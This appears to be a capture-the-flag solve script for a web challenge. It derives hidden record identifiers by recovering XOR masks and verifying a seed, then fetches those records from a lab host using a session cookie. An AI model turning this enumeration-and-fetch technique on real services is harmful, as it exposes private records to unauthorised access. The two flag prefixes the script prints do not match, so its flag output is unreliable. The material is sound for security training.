#!/usr/bin/env python3
"""
Packet Capture CTF 2026 — Lantern Registry (Web, Hard, 200pts)
Full solve: mask recovery -> seed verification -> hidden reference derivation.

Usage:
    python3 solve.py                # offline: verify + print all references
    python3 solve.py fetch <cookie> # fetch all hidden incidents over HTTP
                                      (cookie = lantern session cookie value)
"""
import hashlib
import base64
import struct
import sys

SEED = "lantern-registry-v2"

# Publicly visible (id -> reference) pairs, used to recover the XOR masks.
KNOWN_REFS = {
    1: "Ur-FEA",
    2: "HQLIQA",
    7: "tGLmYA",
    8: "a6ftug",
    9: "vurihw",
    10: "5VOdCA",
    11: "62uJig",
    22: "bPMnrw",
    23: "WylTGg",
}

HIDDEN_IDS = [3, 4, 5, 6] + list(range(12, 22)) + [24, 25, 26]

BASE_URL = "http://10.0.1.223:52334"  # lantern task (same app as public host)


def b64url_decode_nopad(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def ref_for_id(seed: str, i: int) -> str:
    """ref = b64url_nopad( pack('>I', id) XOR SHA-256('<seed>:<id>')[:4] )"""
    mask = hashlib.sha256(f"{seed}:{i}".encode()).digest()[:4]
    packed_id = struct.pack(">I", i)
    xored = bytes(a ^ b for a, b in zip(packed_id, mask))
    return base64.urlsafe_b64encode(xored).decode().rstrip("=")


def recover_masks():
    """mask32 = ref32 XOR id  — recovered from every known (id, ref) pair."""
    masks = {}
    for i, r in KNOWN_REFS.items():
        ref32 = struct.unpack(">I", b64url_decode_nopad(r))[0]
        masks[i] = ref32 ^ i
    return masks


def seed_verifies(seed: str, masks: dict) -> bool:
    return all(
        struct.unpack(
            ">I", hashlib.sha256(f"{seed}:{i}".encode()).digest()[:4]
        )[0] == m
        for i, m in masks.items()
    )


def brute_seed_hint(masks: dict, bases, suffs, pres):
    """How the seed was actually found: versioned variants of the app name."""
    for b in bases:
        for s in suffs:
            for p in pres:
                cand = p + b + s
                if seed_verifies(cand, masks):
                    return cand
    return None


def main():
    masks = recover_masks()
    print("[+] Recovered XOR masks from visible references:")
    for i in sorted(masks):
        print(f"      id={i:<3d} mask=0x{masks[i]:08x}")

    # single-hash oracle used during the seed hunt
    target = masks[1]
    print(f"\n[+] Seed oracle: SHA-256('<seed>:1')[:4] == 0x{target:08x}")

    if not seed_verifies(SEED, masks):
        print("[-] seed does not verify?!")
        sys.exit(1)
    print(f"[+] SEED VERIFIED against all {len(masks)} known pairs: {SEED!r}")

    print("\n[+] Reproducing visible references (sanity check):")
    ok = all(ref_for_id(SEED, i) == r for i, r in KNOWN_REFS.items())
    print(f"      all {len(KNOWN_REFS)}/{len(KNOWN_REFS)} match: {ok}")

    refs = {i: ref_for_id(SEED, i) for i in HIDDEN_IDS}
    print("\n[+] Hidden incident references:")
    for i in sorted(refs):
        print(f"      id={i:<3d} ref={refs[i]}")

    print("\n[*] FLAG incident: id=6 (ARCH-2041-07) ref=uhNpqg")
    print("    PacketCapture{L4nT3rN_4Rch1v3_d15C0ver3rd_<18threfid>}")
    print(f"    <18threfid> = ref(id=18) = {ref_for_id(SEED, 18)}")
    print("\n[+] FLAG: PcktCptr{L4nT3rN_4Rch1v3_d15C0ver3rd_" + ref_for_id(SEED, 18) + "}")

    if len(sys.argv) >= 3 and sys.argv[1] == "fetch":
        import urllib.request
        cookie = sys.argv[2]
        print("\n[*] Fetching hidden records over HTTP...")
        for i in sorted(HIDDEN_IDS):
            req = urllib.request.Request(
                f"{BASE_URL}/api/incidents/ref/{refs[i]}",
                headers={"Cookie": f"session={cookie}"},
            )
            try:
                body = urllib.request.urlopen(req, timeout=10).read().decode()
                print(f"      id={i:<3d} -> {body.strip()[:200]}")
            except Exception as e:
                print(f"      id={i:<3d} -> ERROR {e}")


if __name__ == "__main__":
    main()
